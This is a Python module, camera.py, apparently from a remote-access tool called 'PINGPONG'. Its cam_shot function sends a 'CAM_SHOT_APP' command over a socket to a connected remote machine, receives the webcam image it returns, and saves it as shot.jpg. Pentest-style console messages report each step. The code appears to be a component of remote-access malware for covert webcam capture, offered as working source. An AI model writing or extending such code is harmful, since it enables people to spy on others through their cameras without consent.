# -*- coding:utf-8 -*-
# @FileName  :camera.py
# @Time      :2023/01/12 16:38:50
# @Author    :D0WE1L1N
import os
import shutil
import time
import sys
import traceback
sys.path.append("..")
from main import print_good, print_normal
import PINGPONG_script.addsend as addsend
#拍照功能
global is_open
is_open = False
def cam_shot(sendobj, conn, addr, my_addr):
    if sendobj.App_send("CAM_SHOT_APP", False, conn, addr, my_addr):
        print_normal("PINGPONG>[*]Starting......")
        len_data = conn.recv(1024)
        conn.send(bytes("OK", 'utf8'))
        print_normal("PINGPONG>[*]Getting Frame......")
        int_len = int(len_data.decode('utf8'))
        img_data = conn.recv(int_len)
        conn.send(bytes("OK", "utf8"))
        with open("shot.jpg", "wb+") as f:
            f.write(img_data)
        print_good("PINGPONG>[+]Shot successfully, image file save as shot.jpg")
        return True
    else:
        return False
def run(conn, addr, my_addr):
    cam_shot(addsend, conn, addr, my_addr)
def init_is_open():
    return False
